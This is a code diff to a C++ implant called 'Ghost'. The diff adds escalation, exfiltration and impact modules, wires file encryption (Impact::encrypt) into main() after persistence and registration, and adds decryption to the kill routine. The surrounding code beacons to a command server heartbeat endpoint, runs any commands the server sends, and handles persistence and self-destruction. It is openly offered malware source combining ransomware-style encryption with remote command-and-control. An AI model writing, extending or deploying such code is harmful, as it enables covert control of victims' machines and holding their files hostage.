@@ -9,12 +9,17 @@
 #include "httpClient.hpp"
 #include "utils.hpp"
 
+#include "modules/escalation.hpp"
+#include "modules/exfiltration.hpp"
+#include "modules/impact.hpp"
 #include "modules/persistence.hpp"
 
 class Ghost {
 private:
     std::string uuid;
     std::string hostname;
+
+    bool hasSudo = false;
 
     HttpClient client;
     int currentSleepInterval;
@@ -61,11 +66,20 @@ public:
         LOG_ERROR("Persistence failed")
     }
 
+    void impact() {
+        if (Impact::encrypt() == 0) {
+            return;
+        }
+
+        LOG_ERROR("Impact failed")
+    }
+
     void kill() {
         bool removedPersistence = Persistence::removeRunControl() == 0;
+        bool decrypted = Impact::decrypt() == 0;
         bool selfDestroyed = Persistence::selfDestroy() == 0;
 
-        LOG_ALERT("removed persistence: {}, self destroyed: {}", removedPersistence, selfDestroyed)
+        LOG_ALERT("removed persistence: {}, decrypted files: {}, self destroyed: {}", removedPersistence, decrypted, selfDestroyed)
         
         // exit
         std::exit(0);
@@ -80,7 +94,7 @@ public:
             } else {
                 LOG_INFO("[BEACON] Heartbeat sent (idle)")
             }
-            
+
             HeartbeatRequestDto heartbeat;
             heartbeat.id = uuid;
             heartbeat.results = pendingResults;
@@ -88,7 +102,7 @@ public:
             std::string rawResponse = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", heartbeat.toJson());
 
             bool taskExecuted = false;
-            
+
             if (!rawResponse.empty()) {
                 pendingResults.clear();
 
@@ -135,7 +149,7 @@ private:
             result.output = "GOODBYE";
             result.status = TaskStatus::Done;
             LOG_ALERT("GOODBYE")
-            
+
             pendingResults.push_back(result);
 
             std::thread([]() {
@@ -149,7 +163,7 @@ private:
         result.output = Utils::executeCommand(task.command + " " + task.args);
         result.status = TaskStatus::Done;
         LOG_SUCCESS("Task {} executed with output: {}", task.command, result.output)
-        
+
         pendingResults.push_back(result);
     }
 
@@ -173,6 +187,7 @@ int main() {
 
     ghost.persist();
     ghost.registerGhost();
+    ghost.impact(); // here for testing for now
     ghost.beacon();
 
     return 0;
